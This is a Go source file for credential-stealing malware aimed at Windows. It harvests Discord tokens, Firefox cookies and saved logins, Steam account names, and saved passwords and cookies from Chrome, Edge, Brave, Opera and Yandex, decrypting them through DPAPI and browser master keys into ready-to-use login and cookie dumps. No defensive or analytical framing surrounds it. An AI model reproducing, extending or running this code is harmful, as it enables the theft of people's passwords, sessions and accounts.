package main

import (
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var discordRegex = regexp.MustCompile(`dQw4w9WgXcQ:[^"]*`)

func getDiscord() string {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return ""
	}
	lsPath := filepath.Join(appdata, "discord", "Local Storage", "leveldb")
	if _, err := os.Stat(lsPath); os.IsNotExist(err) {
		return ""
	}
	localStatePath := filepath.Join(appdata, "discord", "Local State")
	dpapKey, appbKey, err := GetChromiumMasterKeys(localStatePath)
	if err != nil {
		log_(fmt.Sprintf("getDiscord: GetChromiumMasterKeys: %v", err))
	}
	entries, err := os.ReadDir(lsPath)
	if err != nil {
		return ""
	}
	var tokens []string
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		filePath := filepath.Join(lsPath, entry.Name())
		content, err := os.ReadFile(filePath)
		if err != nil {
			continue
		}
		lines := strings.Split(string(content), "\n")
		for _, line := range lines {
			matches := discordRegex.FindAllString(line, -1)
			for _, match := range matches {
				encoded := strings.Replace(match, "dQw4w9WgXcQ:", "", 1)
				raw, err := base64.StdEncoding.DecodeString(encoded)
				if err != nil {
					raw, err = base64.RawStdEncoding.DecodeString(encoded)
					if err != nil {
						continue
					}
				}
				token, err := DecryptChrome(raw, dpapKey, appbKey)
				if err != nil {
					dec, err := dpiaDecrypt(raw)
					if err != nil {
						continue
					}
					token = string(dec)
				}
				if token != "" {
					tokens = append(tokens, token)
				}
			}
		}
	}
	return strings.Join(tokens, "\n")
}

type geckoResult struct {
	Cookies []string
	Logins  []string
}

type geckoLoginFile struct {
	NextID int               `json:"nextId"`
	Logins []geckoLoginEntry `json:"logins"`
}

type geckoLoginEntry struct {
	Hostname          string `json:"hostname"`
	EncryptedUsername string `json:"encryptedUsername"`
	EncryptedPassword string `json:"encryptedPassword"`
}

func getGecko(profilePath string, key3Path string, key4Path string) geckoResult {
	var result geckoResult
	cookiesPath := filepath.Join(profilePath, "cookies.sqlite")
	if _, err := os.Stat(cookiesPath); err == nil {
		result.Cookies = getGeckoCookies(cookiesPath)
	}
	loginsPath := filepath.Join(profilePath, "logins.json")
	if _, err := os.Stat(loginsPath); err == nil {
		result.Logins = getGeckoLogins(key3Path, key4Path, profilePath, loginsPath)
	}
	return result
}

func getGeckoCookies(dbPath string) []string {
	dsn := fmt.Sprintf("file:%s?mode=ro&immutable=1", dbPath)
	db, err := sql.Open("sqlite3", dsn)
	if err != nil {
		return nil
	}
	defer db.Close()

	rows, err := db.Query("SELECT name, value, host, path, expiry FROM moz_cookies")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var cookies []string
	for rows.Next() {
		var name, value, host, path string
		var expiry int64
		if err := rows.Scan(&name, &value, &host, &path, &expiry); err != nil {
			continue
		}
		sessionFlag := "FALSE"
		if expiry != 0 {
			sessionFlag = "TRUE"
		}
		httpOnly := "FALSE"
		if len(host) > 0 && host[0] == '.' {
			httpOnly = "TRUE"
		}
		line := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s",
			host, sessionFlag, path, httpOnly, expiry, name, value)
		cookies = append(cookies, line)
	}
	return cookies
}

func getGeckoLogins(key3Path, key4Path, profilePath, loginsPath string) []string {
	data, err := os.ReadFile(loginsPath)
	if err != nil {
		return nil
	}
	var lf geckoLoginFile
	if err := json.Unmarshal(data, &lf); err != nil {
		return nil
	}
	masterKey, err := GetGeckoMasterKey(key3Path, key4Path)
	if err != nil {
		log_(fmt.Sprintf("getGeckoLogins: master key error: %v", err))
	}
	var results []string
	for _, entry := range lf.Logins {
		userBytes, err := base64.StdEncoding.DecodeString(entry.EncryptedUsername)
		if err != nil {
			continue
		}
		passBytes, err := base64.StdEncoding.DecodeString(entry.EncryptedPassword)
		if err != nil {
			continue
		}
		user, err := DecryptGecko(masterKey, userBytes)
		if err != nil {
			continue
		}
		pass, err := DecryptGecko(masterKey, passBytes)
		if err != nil {
			continue
		}
		line := fmt.Sprintf("URL: %s\r\nLogin: %s\r\nPassword: %s",
			entry.Hostname, string(user), string(pass))
		results = append(results, line)
	}
	return results
}

var (
	cryptProtectData = syscall.NewLazyDLL("crypt32.dll").NewProc("CryptUnprotectData")
	localFree        = syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func decodeSteam(ciphertextHex string, entropy string) (string, error) {
	raw, err := hex.DecodeString(ciphertextHex)
	if err != nil {
		return "", fmt.Errorf("decodeSteam: hex decode: %w", err)
	}
	var entropyBlob *dataBlob
	if entropy != "" {
		eb := []byte(entropy)
		entropyBlob = &dataBlob{
			cbData: uint32(len(eb)),
			pbData: &eb[0],
		}
	} else {
		entropyBlob = &dataBlob{}
	}
	inBlob := &dataBlob{
		cbData: uint32(len(raw)),
		pbData: &raw[0],
	}
	var outBlob dataBlob
	ret, _, err := cryptProtectData.Call(
		uintptr(unsafe.Pointer(inBlob)),
		0,
		uintptr(unsafe.Pointer(entropyBlob)),
		0, 0, 1,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return "", fmt.Errorf("CryptUnprotectData: %v", err)
	}
	defer localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	result := make([]byte, outBlob.cbData)
	for i := uint32(0); i < outBlob.cbData; i++ {
		result[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(outBlob.pbData)) + uintptr(i)))
	}
	return string(result), nil
}

type steamAccount struct {
	SteamID     string
	AccountName string
	Password    string
}

func getSteams() []steamAccount {
	steamPath, err := getSteamPathFromRegistry()
	if err != nil {
		steamPath = `c:\program files (x86)\steam`
	}
	if _, err := os.Stat(steamPath); err != nil {
		return nil
	}
	var accounts []steamAccount
	configVdf := filepath.Join(steamPath, "config.vdf")
	steamIDs := parseVdfSteamIDs(configVdf)
	loginUsersVdf := filepath.Join(steamPath, "config", "loginusers.vdf")
	accountNames := parseVdfAccountNames(loginUsersVdf)

	for _, sid := range steamIDs {
		acc := steamAccount{SteamID: sid}
		if name, ok := accountNames[sid]; ok {
			acc.AccountName = name
		}
		accounts = append(accounts, acc)
	}
	fallbackPath := `c:\program files (x86)\steam`
	if !equalCI(steamPath, fallbackPath) {
		if _, err := os.Stat(fallbackPath); err == nil {
			fallbackConfig := filepath.Join(fallbackPath, "config.vdf")
			fallbackIDs := parseVdfSteamIDs(fallbackConfig)
			fallbackLogins := filepath.Join(fallbackPath, "config", "loginusers.vdf")
			fallbackNames := parseVdfAccountNames(fallbackLogins)

			for _, sid := range fallbackIDs {
				acc := steamAccount{SteamID: sid}
				if name, ok := fallbackNames[sid]; ok {
					acc.AccountName = name
				}
				accounts = append(accounts, acc)
			}
		}
	}
	return accounts
}

func getSteamPathFromRegistry() (string, error) {
	reg := syscall.NewLazyDLL("advapi32.dll")
	regOpenKeyEx := reg.NewProc("RegOpenKeyExW")
	regQueryValueEx := reg.NewProc("RegQueryValueExW")
	regCloseKey := reg.NewProc("RegCloseKey")

	var hkey syscall.Handle
	keyPath, _ := syscall.UTF16PtrFromString(`SOFTWARE\Valve\Steam`)

	ret, _, _ := regOpenKeyEx.Call(
		0x80000002,
		uintptr(unsafe.Pointer(keyPath)),
		0, 0x20019,
		uintptr(unsafe.Pointer(&hkey)),
	)
	if ret != 0 {
		return "", fmt.Errorf("RegOpenKeyExW: %d", ret)
	}
	defer regCloseKey.Call(uintptr(hkey))

	valueName, _ := syscall.UTF16PtrFromString("SteamPath")
	buf := make([]uint16, 260)
	bufLen := uint32(len(buf) * 2)
	var valType uint32

	ret, _, _ = regQueryValueEx.Call(
		uintptr(hkey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(unsafe.Pointer(&valType)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufLen)),
	)
	if ret != 0 {
		return "", fmt.Errorf("RegQueryValueExW: %d", ret)
	}
	return syscall.UTF16ToString(buf), nil
}

func parseVdfSteamIDs(path string) []string {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var ids []string
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, `"`) && len(line) > 3 {
			key := strings.Trim(line, `"`)
			if len(key) == 17 && isDigits(key) {
				ids = append(ids, key)
			}
		}
	}
	return ids
}

func parseVdfAccountNames(path string) map[string]string {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	result := make(map[string]string)
	var currentID string
	lines := strings.Split(string(data), "\n")

	for i, line := range lines {
		line = strings.TrimSpace(line)
		key := strings.Trim(line, `"`)
		if len(key) == 17 && isDigits(key) {
			currentID = key
		}
		if strings.Contains(line, `"AccountName"`) && i+1 < len(lines) {
			val := strings.Trim(strings.TrimSpace(lines[i]), `"`)
			parts := strings.SplitN(val, `"`, -1)
			if len(parts) >= 4 {
				result[currentID] = parts[3]
			}
		}
	}
	return result
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

type browserProfile struct {
	Name       string
	Path       string
	LocalState string
}

var chromeBrowsers = []browserProfile{
	{
		Name:       "Chrome",
		Path:       filepath.Join(os.Getenv("LOCALAPPDATA"), `Google\Chrome\User Data`),
		LocalState: filepath.Join(os.Getenv("LOCALAPPDATA"), `Google\Chrome\User Data\Local State`),
	},
	{
		Name:       "Edge",
		Path:       filepath.Join(os.Getenv("LOCALAPPDATA"), `Microsoft\Edge\User Data`),
		LocalState: filepath.Join(os.Getenv("LOCALAPPDATA"), `Microsoft\Edge\User Data\Local State`),
	},
	{
		Name:       "Brave",
		Path:       filepath.Join(os.Getenv("LOCALAPPDATA"), `BraveSoftware\Brave-Browser\User Data`),
		LocalState: filepath.Join(os.Getenv("LOCALAPPDATA"), `BraveSoftware\Brave-Browser\User Data\Local State`),
	},
	{
		Name:       "Opera",
		Path:       filepath.Join(os.Getenv("APPDATA"), `Opera Software\Opera Stable`),
		LocalState: filepath.Join(os.Getenv("APPDATA"), `Opera Software\Opera Stable\Local State`),
	},
}

func getChrome() map[string]interface{} {
	result := make(map[string]interface{})

	for _, browser := range chromeBrowsers {
		if _, err := os.Stat(browser.LocalState); err != nil {
			continue
		}
		dpapKey, appbKey, err := GetChromiumMasterKeys(browser.LocalState)
		if err != nil {
			log_(fmt.Sprintf("getChrome[%s]: master key error: %v", browser.Name, err))
			continue
		}
		profiles := []string{"Default"}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		var logins, cookies []string
		for _, profile := range profiles {
			profilePath := filepath.Join(browser.Path, profile)
			if _, err := os.Stat(profilePath); err != nil {
				continue
			}
			l, c := extractChromiumProfile(profilePath, dpapKey, appbKey)
			logins = append(logins, l...)
			cookies = append(cookies, c...)
		}

		result[browser.Name] = map[string]interface{}{
			"logins":  logins,
			"cookies": cookies,
		}
	}
	return result
}

func extractChromiumProfile(profilePath string, dpapKey, appbKey []byte) (logins []string, cookies []string) {
	loginDB := filepath.Join(profilePath, "Login Data")
	if _, err := os.Stat(loginDB); err == nil {
		logins = extractChromiumLogins(loginDB, dpapKey, appbKey)
	}

	cookieDB := filepath.Join(profilePath, "Network", "Cookies")
	if _, err := os.Stat(cookieDB); err != nil {
		cookieDB = filepath.Join(profilePath, "Cookies")
	}
	if _, err := os.Stat(cookieDB); err == nil {
		cookies = extractChromiumCookies(cookieDB, dpapKey, appbKey)
	}
	return
}

func extractChromiumLogins(dbPath string, dpapKey, appbKey []byte) []string {
	dsn := fmt.Sprintf("file:%s?mode=ro&immutable=1", dbPath)
	db, err := sql.Open("sqlite3", dsn)
	if err != nil {
		return nil
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var url, username string
		var passBlob []byte

		if err := rows.Scan(&url, &username, &passBlob); err != nil {
			continue
		}
		pass, err := DecryptChrome(passBlob, dpapKey, appbKey)
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("URL: %s\r\nLogin: %s\r\nPassword: %s",
			url, username, pass))
	}
	return results
}

func extractChromiumCookies(dbPath string, dpapKey, appbKey []byte) []string {
	dsn := fmt.Sprintf("file:%s?mode=ro&immutable=1", dbPath)
	db, err := sql.Open("sqlite3", dsn)
	if err != nil {
		return nil
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var host, name, path string
		var encVal []byte
		var expiry int64
		var isSecure bool

		if err := rows.Scan(&host, &name, &encVal, &path, &expiry, &isSecure); err != nil {
			continue
		}
		val, err := DecryptChrome(encVal, dpapKey, appbKey)
		if err != nil {
			continue
		}
		secure := "FALSE"
		if isSecure {
			secure = "TRUE"
		}
		results = append(results, fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s",
			host, path, secure, expiry, name, val))
	}
	return results
}

func getYandexLogins() []string {
	yandexPath := filepath.Join(os.Getenv("LOCALAPPDATA"), `Yandex\YandexBrowser\User Data`)
	localState := filepath.Join(yandexPath, "Local State")

	if _, err := os.Stat(localState); err != nil {
		return nil
	}
	dpapKey, appbKey, err := GetChromiumMasterKeys(localState)
	if err != nil {
		return nil
	}
	loginDB := filepath.Join(yandexPath, "Default", "Login Data")
	return extractChromiumLogins(loginDB, dpapKey, appbKey)
}

func dpiaDecrypt(data []byte) ([]byte, error) {
	var inBlob, outBlob dataBlob
	inBlob.cbData = uint32(len(data))
	inBlob.pbData = &data[0]

	crypt32 := syscall.NewLazyDLL("crypt32.dll")
	cryptUnprotectData := crypt32.NewProc("CryptUnprotectData")

	ret, _, err := cryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData: %v", err)
	}
	defer localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	result := make([]byte, outBlob.cbData)
	for i := uint32(0); i < outBlob.cbData; i++ {
		result[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(outBlob.pbData)) + uintptr(i)))
	}
	return result, nil
}
